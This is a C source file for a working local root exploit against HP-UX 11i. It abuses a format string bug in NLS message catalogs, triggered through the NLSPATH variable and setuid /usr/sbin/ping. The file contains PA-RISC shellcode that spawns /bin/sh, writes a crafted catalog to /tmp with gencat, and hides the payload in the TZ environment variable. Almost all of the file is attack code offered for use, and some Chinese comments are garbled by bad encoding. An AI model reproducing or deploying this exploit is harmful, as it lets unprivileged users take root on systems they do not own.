/*********************************************************************************************
*  Name    : x_hpux_11i_nls_ping.c
*  Usage   : cc x_hpux_11i_nls_ping.c -o x_ping ; ./x_ping
*  Purpose :
*    HP-UX��������ϵͳ��ʽ����©�����/usr/sbin/ping�����ó��򣬱����û�����ͨ����ȡ��root��Ȩ��
*    Get local rootshell from /usr/sbin/ping using HPUX location language format string bug.
*  Author  : watercloud 
*  Date    : 2003-1-4
*  Tested  : On HP-UX B11.11
*  Note    : Use as your risk! 
*  Other   : ĿǰΪֹHP��û����صĲ���.  Now there is no patch from HP.
*********************************************************************************************/
#include<stdio.h>

#define PATH "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin"
#define TERM "TERM=xterm"
#define NLSPATH "NLSPATH=/tmp/.ex.cat"

#define CMD  "/usr/sbin/ping abc_ "
#define MSG "\$set 1\n2 "
#define PRT_ARG_NUM 1    /* xprintf([x1],[x2],"fm" . .) x1 and x2 all exists eq 3  */
#define STACK_LEN 0x140  /* The space of caller-fprintf to main function stack offset  */

#define ENV_BEGIN 0x40   /* Our buffer put in TZ ENV's begin address */
#define ENV_LEN   0x40   /* Our env len */
#define LOW_STACK 0x210  /* Our's main stack begin addr, for all program because our env len :) */

char buffer[512];
char buff[72]=
  "\x0b\x5a\x02\x9a\x34\x16\x03\xe8\x20\x20\x08\x01\xe4\x20\xe0\x08"
  "\x96\xd6\x04\x16\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
  "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x70\x16"
  "/bin/shA";
int * pint = (int *) &buff[56];
unsigned int haddr = 0;      /* heigh 16 bit of stack address    */
unsigned int dstaddr = 0;    /* fprintf's return addr store here */

int main(argc,argv,env)
int argc;char ** argv;char **env;
{
	unsigned int * pa = (unsigned int*)env;
	FILE * fp = NULL;
	int xnum = (LOW_STACK - ENV_BEGIN + STACK_LEN -56 -12 -36 -PRT_ARG_NUM*4)/4;  /* the number of %.8x */
	int alig1= ENV_BEGIN - xnum*8;
	int alig2=0;
	int i=0;

	while(*pa != NULL)         /* clean all env */
		*pa++=0;
	
	if(strlen(CMD) >ENV_BEGIN-3)
	{
		printf("No enough space to alig our env!\n");
		exit(1);
	}

	haddr = (unsigned int)&fp & 0xffff0000;
	if(alig1 < 0)
	  alig1+=0x10000;
	alig2 = (haddr >> 16) - alig1 -xnum*8 ;
	if(alig2 < 0)
	  alig2+=0x10000;

	dstaddr= haddr+ LOW_STACK + STACK_LEN -24;   /* fprintf's return addr stored here */ 
	*pint++=dstaddr;
	*pint++=dstaddr;
	*pint++=dstaddr;
	*pint = 0;
	
	/* begin to make our .cat file */
	fp = fopen("/tmp/.ex.k","w");
	if(fp == NULL)
	{
	  printf("open file : /tmp/.ex.k for write error.\n");
	  exit(1);
	}
	fprintf(fp,"%s",MSG);
	for(;i<xnum;i++)
	  fprintf(fp,"%%.8x");
	fprintf(fp,"%%.%ix%%n",alig1);
	fprintf(fp,"%%.%ix%%hn",alig2);
	fclose(fp);
	fp = NULL;
	system("/usr/bin/gencat /tmp/.ex.cat /tmp/.ex.k");
	unlink("/tmp/.ex.k");
	/* end make our .cat file */

	/* put our env,store our shellcode and address info . . . and so on */
	sprintf(buffer,"TZ=%*s%s%*s",ENV_BEGIN-3-strlen(CMD),"A",buff,ENV_BEGIN+ENV_LEN-strlen(buff),"B");
	putenv(buffer);
	putenv(PATH);
	putenv(TERM);
	putenv(NLSPATH);
	
	printf("�ǵ�ɾ�������ʱ�ļ�(Remember to delete the  file): /tmp/.ex.cat .\n");
	execl("/usr/sbin/ping","/usr/sbin/ping","abc_",0);   /* ��Ϸ��ʼ�� ����  */
}